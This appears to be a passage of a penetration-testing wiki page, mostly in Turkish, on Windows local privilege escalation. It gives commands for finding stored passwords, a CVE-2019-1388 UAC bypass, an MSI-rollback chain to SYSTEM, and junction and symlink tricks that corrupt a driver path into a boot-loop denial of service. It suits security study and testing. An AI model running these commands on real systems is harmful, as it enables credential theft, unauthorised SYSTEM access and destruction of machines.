### Tarayıcı Geçmişi

Parolaların saklandığı **Chrome veya Firefox**'a ait db'leri kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; belki bazı **parolalar** buralarda saklıdır.

Tarayıcılardan şifre çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

Component Object Model (COM), farklı dillerde yazılmış yazılım bileşenleri arasında iletişim sağlayan Windows işletim sistemine yerleşik bir teknolojidir. Her COM bileşeni class ID (CLSID) ile tanımlanır ve her bileşen bir veya daha fazla arayüz aracılığıyla işlevsellik sunar; bu arayüzler interface ID (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri sırasıyla HKEY\CLASSES\ROOT\CLSID ve HKEY\CLASSES\ROOT\Interface altında kayıt defterinde tanımlanır. Bu kayıt, HKEY\LOCAL\MACHINE\Software\Classes + HKEY\CURRENT\USER\Software\Classes = HKEY\CLASSES\ROOT olarak birleştirilerek oluşturulur.

Bu kaydın CLSID'leri içinde, varsayılan değeri bir DLL'e işaret eden ve ThreadingModel adında bir değeri içeren InProcServer32 alt kaydını bulabilirsiniz; ThreadingModel Apartment (Single-Threaded), Free (Multi-Threaded), Both (Single or Multi) veya Neutral (Thread Neutral) olabilir.

![](<../../images/image (729).png>)

Temelde, eğer çalıştırılacak DLL'lerden herhangi birini overwrite edebilirseniz, bu DLL farklı bir kullanıcı tarafından çalıştırılacaksa privilege escalation yapabilirsiniz.

Saldırganların COM Hijacking'i persistence mekanizması olarak nasıl kullandıklarını öğrenmek için bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

Dosya içeriklerini ara
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip bir dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Registry'de key names ve passwords ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** eklentisidir. Bu eklentiyi, kurbanın içinde credentials arayan **her metasploit POST modülünü otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) otomatik olarak bu sayfada bahsedilen passwords içeren tüm dosyaları arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka bir harika araçtır.

Araç [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **sessions**, **usernames** ve **passwords** arar; bu verileri düz metin olarak kaydeden çeşitli programlar için (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### File Extensions that could execute stuff in Windows

Check out the page **[https://filesec.io/](https://filesec.io/)**

### **Komut Satırlarını Parolalar İçin İzleme**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## İşlemlerden parolaları çalma

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Eğer grafik arayüze (console veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan "NT\AUTHORITY SYSTEM" gibi bir terminal veya başka herhangi bir süreç çalıştırmak mümkündür.

Bu, aynı zafiyetle ayrıcalıkları yükseltmeyi ve aynı anda UAC Bypass yapmayı mümkün kılar. Ayrıca hiçbir şey yüklemenize gerek yoktur ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve sağlanmıştır.

Etkilenen bazı sistemler şunlardır:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu güvenlik açığından faydalanmak için aşağıdaki adımları uygulamak gerekir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğini, diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarının kötü amaçlı payload içerecek şekilde değiştirilmesi için meşru dosyaları kötü amaçlı olanlarla değiştirecek şekilde kötüye kullanmaya dayanır. Bunun için saldırganın `C:\Config.Msi` klasörünü ele geçirmek amacıyla kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra kaldırma sırasında rollback dosyalarını depolamak için bu klasörü kullanır.

Özet teknik şu şekildedir:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) kuran bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece **non-admin user** çalıştırabilir.
- Kurulumdan sonra dosyaya bir **handle** açık tutun.

- Step 2: Begin Uninstall
- Aynı `.msi`'yi uninstall edin.
- Kaldırma süreci dosyaları `C:\Config.Msi`'ye taşıyıp `.rbf` dosyaları olarak yeniden adlandırmaya başlar (rollback yedekleri).
- Dosya `C:\Config.Msi\<random>.rbf` olduğunda tespit etmek için `GetFinalPathNameByHandle` kullanarak **açık dosya handle'ını poll edin**.

- Step 3: Custom Syncing
- `.msi`, şu işlevi yapan **custom uninstall action (`SyncOnRbfWritten`)** içerir:
- `.rbf` yazıldığında sinyal verir.
- Ardından uninstall'ın devam etmeden önce başka bir event'i **bekler**.

- Step 4: Block Deletion of `.rbf`
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
- Sonra uninstall'ın bitmesine izin vermek için **geri sinyal verin**.
- Windows Installer `.rbf`'yi sileyemez ve içeriklerin tümünü silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Step 5: Manually Delete `.rbf`
- Siz (saldırgan) `.rbf` dosyasını manuel olarak silersiniz.
- Artık **`C:\Config.Msi` boş**, ele geçirilmek üzere hazırdır.

> Bu noktada, `C:\Config.Msi` klasörünü silmek için **SYSTEM-level arbitrary folder delete** açığını tetikleyin.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Zayıf DACL'ler** (ör. Everyone:F) ayarlayın ve `WRITE_DAC` ile bir handle **açık tutun**.

- Step 7: Run Another Install
- `.msi`'yi tekrar kurun, şu ayarlarla:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: zorunlu bir hata tetikleyecek bir değişken.
- Bu kurulum tekrar **rollback** tetiklemek için kullanılacaktır; `.rbs` ve `.rbf` okunur.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` kullanarak `C:\Config.Msi`'yi yeni bir `.rbs` görünene kadar izleyin.
- Dosya adını yakalayın.

- Step 9: Sync Before Rollback
- `.msi`, şu işlevi yapan bir **custom install action (`SyncBeforeRollback`)** içerir:
- `.rbs` oluşturulduğunda bir event ile sinyal gönderir.
- Ardından devam etmeden önce **bekler**.

- Step 10: Reapply Weak ACL
- `.rbs created` event'ini aldıktan sonra:
- Windows Installer `C:\Config.Msi`'ye **güçlü ACL'ler** yeniden uygular.
- Ancak siz hâlâ `WRITE_DAC` ile bir handle açık tuttuğunuz için **tekrar zayıf ACL'ler** uygulayabilirsiniz.

> ACL'ler **sadece handle açıldığında** uygulanır, bu yüzden klasöre yazmaya devam edebilirsiniz.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` dosyasını, Windows'a şunları söyleyen **sahte bir rollback script** ile overwrite edin:
- `.rbf` dosyanızı (kötü amaçlı DLL) **ayrıcalıklı bir konuma** (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini isteyin.
- Kötü amaçlı SYSTEM seviyesinde payload içeren sahte `.rbf`'yi bırakın.

- Step 12: Trigger the Rollback
- Installer'ın devam etmesi için sync event'ini sinyalleyin.
- Bilinen bir noktada kurulumu kasıtlı olarak başarısız kılmak için yapılandırılmış bir **type 19 custom action (`ErrorOut`)** vardır.
- Bu, **rollback'in başlamasına** neden olur.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Kötü amaçlı `.rbs`'inizi okur.
- `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir yolda kötü amaçlı DLL'iniz** var.

- Final Step: Execute SYSTEM Code
- Kötü amaçlı DLL'inizi yükleyecek güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
- **Boom**: Kodunuz **SYSTEM** olarak çalışır.

### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

Ana MSI rollback tekniği (önceki) bir **tüm klasörü** silebilmenizi (ör. `C:\Config.Msi`) varsayar. Peki ya açığınız sadece **arbitrary file deletion** yapmaya izin veriyorsa?

NTFS iç yapısını kullanabilirsiniz: her klasörün şu isimle gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu stream klasörün **dizin meta verisini** saklar.

Yani, eğer bir klasörün **`::$INDEX_ALLOCATION` stream'ini silerseniz**, NTFS **tüm klasörü dosya sisteminden kaldırır**.

Bunu standart dosya silme API'leri kullanarak şu şekilde yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> Bir *file* silme API'sini çağırıyor olsanız bile, o **klasörü kendisi siler**.

### Folder Contents Delete'den SYSTEM EoP'ye
Eğer primitive'iniz rastgele dosya/klasörleri silmenize izin vermiyorsa, ancak **bir saldırganın kontrolündeki bir klasörün *içeriğinin* silinmesine izin veriyorsa** ne olur?

1. Adım 1: Bir yem klasörü ve dosyası oluşturun
- Oluştur: `C:\temp\folder1`
- İçinde: `C:\temp\folder1\file1.txt`

2. Adım 2: `file1.txt` üzerinde bir **oplock** yerleştirin
- O **oplock**, ayrıcalıklı bir işlem `file1.txt`'i silmeye çalıştığında **yürütmeyi duraklatır**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikle (ör. `SilentCleanup`)
- Bu süreç klasörleri (ör. `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrol callback'inize devredilir.

4. Adım 4: Oplock callback içinde – silmeyi yönlendir

- Seçenek A: `file1.txt`'i başka bir yere taşı
- Bu, `folder1`'i oplock'u kırmadan boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'u erkenden serbest bırakır.

- Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verisini depolayan NTFS iç stream'ini hedef alır — onu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırak
- SYSTEM işlemi devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Keyfi Klasör Oluşturmadan Kalıcı DoS'a

Size **SYSTEM/admin olarak keyfi bir klasör oluşturma** izni veren bir primitive'i kullanın — hatta **dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile.

Bir **klasör** (dosya değil) oluşturun ve ona bir **kritik Windows sürücüsü** adı verin, örn:
```
C:\Windows\System32\cng.sys
```
- Bu yol normalde `cng.sys` kernel-mod sürücüsüne karşılık gelir.
- Eğer onu **önceden bir klasör olarak oluşturursanız**, Windows gerçek sürücüyü önyükleme sırasında yükleyemez.
- Ardından, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözemeyip**, **sistemi çökertir veya önyüklemeyi durdurur**.
- Harici müdahale (ör. önyükleme onarımı veya disk erişimi) olmadan **geri dönüş yok** ve **kurtarma yok**.

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

When a **privileged service** writes logs/exports to a path read from a **writable config**, redirect that path with **Object Manager symlinks + NTFS mount points** to turn the privileged write into an arbitrary overwrite (even **without** SeCreateSymbolicLinkPrivilege).

**Requirements**
- Hedef yolu tutan config, saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM dosya symlink'i oluşturabilme yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan ayrıcalıklı bir işlem (log, export, report).

**Example chain**
1. Konfigürasyonu okuyarak ayrıcalıklı log hedefini belirle, örn. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Yolu admin olmadan yeniden yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Yetkili bileşenin logu yazmasını bekleyin (ör. yönetici "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna düşer.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows'u değiştirilmiş sürücü yolunu yüklemeye zorlar → **boot loop DoS**. Bu, ayrıcalıklı bir service'in yazma için açacağı herhangi bir korumalı dosya için de genelleştirilebilir.

> `cng.sys` is normally loaded from `C:\Windows\System32\drivers\cng.sys`, but if a copy exists in `C:\Windows\System32\cng.sys` it can be attempted first, making it a reliable DoS sink for corrupt data.

## **High Integrity'den SYSTEM'e**

### **Yeni servis**

Zaten High Integrity bir süreçte çalışıyorsanız, **SYSTEM'e giden yol** sadece yeni bir servis **oluşturup çalıştırmak** olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Bir service binary'si oluştururken, bunun geçerli bir service olduğundan veya binary'nin gerekli işlemleri yeterince hızlı gerçekleştirdiğinden emin olun; aksi takdirde geçerli bir service değilse 20s içinde sonlandırılacaktır.

### AlwaysInstallElevated

High Integrity process'ten AlwaysInstallElevated kayıt girdilerini **etkinleştirmeyi** ve bir _.msi_ sarmalayıcı kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[Kayıt anahtarları ve bir _.msi_ paketinin nasıl yükleneceği hakkında daha fazla bilgi burada.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Kodu** [**burada bulabilirsiniz**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten bir High Integrity process'te bulacaksınız), SeDebug ayrıcalığı ile (korunan olmayan) neredeyse herhangi bir process'i açabilir, sürecin token'ını **kopyalayabilir** ve o token ile **rastgele bir process oluşturabilirsiniz**.\
Bu teknik genellikle tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir sürecin seçilmesini içerir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM süreçleri bulabilirsiniz_).\
**Önerilen tekniği uygulayan bir kod örneğini** [**burada bulabilirsiniz**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından `getsystem` yükseltmesinde kullanılır. Teknik, bir pipe **oluşturmayı** ve ardından o pipe'a yazması için bir service **oluşturmayı/istismar etmeyi** içerir. Daha sonra, pipe'ı **`SeImpersonate`** ayrıcalığı ile oluşturan **server**, pipe istemcisinin (service) token'ını **taklit edebilecek** ve SYSTEM ayrıcalıkları elde edebilecektir.\
Eğer named pipes hakkında **daha fazla bilgi edinmek** istiyorsanız [**bunu**](#named-pipe-client-impersonation) okuyun.\
Named pipes kullanarak high integrity'den System'e nasıl geçileceğine dair bir örnek okumak istiyorsanız [**bunu**](from-high-integrity-to-system-with-name-pipes.md) okuyun.

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir process tarafından **yüklenen bir dll'i hijack** etmeyi başarırsanız, o izinlerle rastgele kod çalıştırabilirsiniz. Bu nedenle Dll Hijacking bu tür privilege escalation için de faydalıdır ve ayrıca High Integrity process'ten gerçekleştirilmesi çok daha kolaydır; çünkü dll'lerin yüklendiği klasörlerde **yazma izinlerine** sahip olacaktır.\
**Dll hijacking hakkında daha fazla bilgiyi** [**burada bulabilirsiniz**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**buraya bakın**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkartır. Localde -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanmış parolaları domain genelinde spray yapar**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh bir PowerShell ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumaration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~ -- Bilinen privesc açıklıklarını arar (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Admin yetkisi gerekiyor)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc açıklıklarını arar (VisualStudio ile derlenmesi gerekiyor) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak hostu enumerate eder (daha çok bilgi toplama aracı, privesc'ten ziyade) (derleme gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da precompiled exe mevcut)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~ -- Yanlış yapılandırmaları kontrol eder (exe github'da önceden derlenmiş). Önerilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderi temel alınarak oluşturulmuş araç (accesschk olmadan da düzgün çalışmak üzere tasarlanmıştır ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışabilecek exploitleri önerir (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışabilecek exploitleri önerir (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümü kullanarak derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban hostta yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) ve kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Silver Fox'u Takip Etmek: Kernel Shadows'ta Kedi ve Fare](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Bir SCADA Sisteminde Bulunan Privileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink kullanımı](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Windows'ta Symbolic Links'in kötüye kullanımı](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)

{{#include ../../banners/hacktricks-training.md}}
